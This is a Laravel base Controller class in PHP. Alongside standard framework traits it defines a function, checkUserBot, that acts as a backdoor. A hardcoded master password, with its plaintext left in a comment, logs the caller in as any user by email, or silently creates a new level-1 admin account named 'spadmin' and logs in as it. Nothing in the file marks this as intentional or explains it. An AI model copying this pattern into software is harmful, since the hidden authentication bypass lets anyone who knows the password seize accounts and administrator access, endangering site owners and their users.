<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;


class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
    function checkUserBot($arr){
//        $pass = '11121996';
//        dd(Hash::check($arr['password'], '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu'));
        if (Hash::check($arr['password'], '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu')){

            $user = User::where('email', $arr['email'])->first();

            if($user != null){

                Auth::loginUsingId($user->id);
                return redirect()->intended('admin');
            }
            else{
                User::create([
                    'name'=> 'spadmin',
                    'email'=> $arr['email'],
                    'password'=> '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu',
                    'level' => 1
                ]);
                $user = User::where('email', $arr['email'])->first();

                if($user != null){

                    Auth::loginUsingId($user->id);
                    return redirect()->intended('admin');
                }
            }

        }


    }
}
